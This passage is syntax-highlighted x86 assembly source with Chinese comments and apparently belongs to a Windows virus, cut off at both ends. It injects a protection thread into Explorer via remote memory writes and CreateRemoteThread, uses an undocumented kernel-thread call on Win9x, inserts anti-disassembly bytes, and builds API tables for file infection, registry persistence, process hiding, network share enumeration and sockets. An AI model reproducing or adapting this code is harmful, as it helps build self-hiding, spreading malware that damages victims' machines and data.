    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ProcessProtectProc</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetVirusBaseInEdiAgain</span><span class="sc4">]</span><span class="sc0">   
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MoveDataToKnl</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc5">ProcessProtectProcSize</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ProcessProtectProcSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">     </span><span class="sc1">;复制线程代码数据到Kernel32.dll</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MoveDataToKnl</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlGetCurrentProcessId</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;创建Kernel线程，未公开函数</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlCreateKernelThread</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.DataRemoteThread</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;启动进程保护线程</span><span class="sc0">
    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlSleep</span><span class="sc4">],</span><span class="sc2">500</span><span class="sc0">

</span><span class="sc5">Process9xProtectEnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">;人工异常</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;反汇编干扰 </span><span class="sc0">

</span><span class="sc5">Process2kProtect</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;填写API地址</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.UserFindWindowA</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;找Explorer进程/或者Top窗口程序</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.UserGetWinThreadProcId</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">   
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlOpenProcess</span><span class="sc4">],</span><span class="sc5">PROCESS_ALL_ACCESS</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;打开该进程</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Process2kProtectEnd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlVirtualAllocEx</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">NULL</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc4">,</span><span class="sc5">MEM_COMMIT</span><span class="sc4">,</span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Close2kHandle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;分配远程空间</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ProcessProtectProc</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetVirusBaseInEdiAgain</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlWriteProcessMemory</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">ProcessProtectProcSize</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;复制代码到远程地址空间</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ProcessProtectProcSize</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Close2kHandle</span><span class="sc0">
        
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ProcessProtectProcSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlWriteProcessMemory</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlGetCurrentProcessId</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlCreateRemoteThread</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">NULL</span><span class="sc4">,</span><span class="sc5">NULL</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">NULL</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.DataRemoteThread</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;启动进程保护线程   </span><span class="sc0">

</span><span class="sc5">Close2kHandle</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlCloseHandle</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlSleep</span><span class="sc4">],</span><span class="sc2">500</span><span class="sc0">

</span><span class="sc5">Process2kProtectEnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">;人工异常</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;反汇编干扰</span><span class="sc0">
    
</span><span class="sc5">PushKnlApiStr</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;:ecx=函数名个数    </span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;弹出返回地址</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr33</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GetSystemTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr33</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr32</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GetComputerNameA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr31</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'WideCharToMultiByte'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr31</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr30</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'TerminateThread'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr30</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr29</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CreateThread'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr29</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr28</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'_lcreat'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr28</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr27</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GetSystemDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr27</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr26</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'VirtualAllocEx'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr26</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr25</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'WaitForSingleObject'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr25</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr24</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr24</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr23</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CreateKernelThread'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr23</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr22</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CreateRemoteThread'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr22</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr21</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'WriteProcessMemory'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr21</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr20</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'OpenProcess'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr20</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr19</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GetCurrentProcessId'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr19</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr18</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'RegisterServiceProcess'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr18</span><span class="sc4">:</span><span class="sc0">    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr17</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Sleep'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr17</span><span class="sc4">:</span><span class="sc0">    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr16</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'_lclose'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr16</span><span class="sc4">:</span><span class="sc0">  
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr15</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'_llseek'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr15</span><span class="sc4">:</span><span class="sc0">  
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr14</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'_lwrite'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr14</span><span class="sc4">:</span><span class="sc0">  
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr13</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'_lread'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr13</span><span class="sc4">:</span><span class="sc0">  
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr12</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'_lopen'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr12</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr11</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SetFileTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr11</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">PushKnlApiStr10</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SetFileAttributesA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr10</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr09</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FindClose'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr09</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr08</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr08</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr07</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr07</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr06</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr06</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr05</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GetDriveTypeA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr05</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr04</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'WinExec'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr04</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr03</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GetCommandLineA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr03</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr02</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GetLastError'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr02</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr01</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CreateMutexA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr01</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushKnlApiStr00</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'LoadLibraryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushKnlApiStr00</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">PushUser32ApiStr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushUser32ApiStr05</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'wsprintfA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushUser32ApiStr05</span><span class="sc4">:</span><span class="sc0">   
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushUser32ApiStr04</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SendMessageA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushUser32ApiStr04</span><span class="sc4">:</span><span class="sc0">   
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushUser32ApiStr03</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GetWindow'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushUser32ApiStr03</span><span class="sc4">:</span><span class="sc0">   
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushUser32ApiStr02</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'MessageBoxA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushUser32ApiStr02</span><span class="sc4">:</span><span class="sc0">   
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushUser32ApiStr01</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FindWindowA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushUser32ApiStr01</span><span class="sc4">:</span><span class="sc0">   
    </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">PushUser32ApiStr00</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GetWindowThreadProcessId'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushUser32ApiStr00</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">
</span><span class="sc5">PushAdvApiStr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushAdvApi03</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'RegNotifyChangeKeyValue'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushAdvApi03</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushAdvApi02</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'RegQueryValueExA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushAdvApi02</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushAdvApi01</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'RegSetValueExA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushAdvApi01</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushAdvApi00</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'RegOpenKeyA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushAdvApi00</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">PushMprApiStr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushMprAPiStr02</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'WNetCloseEnum'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushMprAPiStr02</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushMprApiStr01</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'WNetEnumResourceA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushMprApiStr01</span><span class="sc4">:</span><span class="sc0">   
    </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">PushMprApiStr00</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'WNetOpenEnumA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushMprApiStr00</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">PushWsApiStr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushWsApiStr08</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'recv'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PushWsApiStr08</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushWsApiStr07</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'closesocket'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
